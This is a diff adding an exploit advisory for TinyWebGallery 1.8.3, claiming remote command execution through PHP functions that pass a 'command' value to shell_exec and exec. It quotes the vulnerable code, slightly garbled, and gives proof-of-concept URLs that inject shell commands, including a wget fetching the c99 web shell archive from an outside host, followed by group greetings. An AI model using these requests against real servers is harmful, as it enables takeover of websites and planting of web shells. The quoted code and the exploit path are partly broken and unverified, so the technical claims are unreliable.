@@ -1,0 +1,76 @@
+<======================================================>
+[»]  TinyWebGallery 1.8.3 Remote Command Execution 
+<======================================================>
+
+    
+     [»]  ---> Date :     05- 01- 2012              
+     [»]  ---> Author :    Expl0!Ts --------> My Best t34m ----->    "BaC , RoBert MilEs , Bl4ck_ID"        
+     [»]  ---> Software Link :  http://www.tinywebgallery.com/dl.php?file=twg_latest    
+     [»]  ---> Version:      n/a         
+     [»]  ---> Category:  php              
+     [»]  ---> Tested on:  wind xp   
+     
+
+        !----- >  THnKs T0 My ALLAH         
+<::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::>
+        bIG tHnkS T0 :-> vbspiders.com & Dz4all.com & isecur1ty.org  
+<::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::>
+<=================Exploit====================>
+ 
+-=[ vuln c0de ]=- 1
+  
+
+  1)  --------------> filefunctions.inc : 
+       
+
+        function execute_command ($command) {
+  global $use_shell_exec;
+                   ob_start();
+     set_error_handler("on_error_no_output");
+  i f (substr(@php_uname(), 0, 7) == "Windows"){
+    // Make a new instance of the COM object
+       $WshShell = new COM("WScript.Shell");
+  // Make the command window but dont show it.
+    $oExec = $WshShell->Run("cmd /C " . $command, 0, true);
+  } else {
+      if ($use_shell_exec) {
+         shell_exec($command);    <--------------------------------------------- error
+
+
+
+
+
+ 1)  ---------> PoC : 
+
+
+      http://127.0.0.1/(patch)/inc/filefunctions.inc?command=<id>;<pwd>;<wget http://shell.org/c99.zip>
+
+
+
+
+-=[ vuln c0de ]=- 2 
+
+
+  2) --------------> ifo.php :
+
+   if ($use_shell_exec) {
+            
+           shell_exec($command);
+      
+       } else {
+     
+            exec($command . " > /dev/null");  <------------------------------------------ error 
+
+
+  2)  ---------> PoC : 
+
+       http://127.0.0.1/(patch)/info.php?command=<id>;<pwd>;<wget http://shell.org/c99.zip>
+
+
+<------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+  Gr33tz :
+       !>   BaC ,!>  Black_ID  ,!>  Kala$nikoV ,!>  Robert miles  ,!>  Dr.Black_ID  , !> AHmEd-HaMaImi , Bel-AiSa , To-KhAlEd 
+<------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+
+
+EnJoY o_O
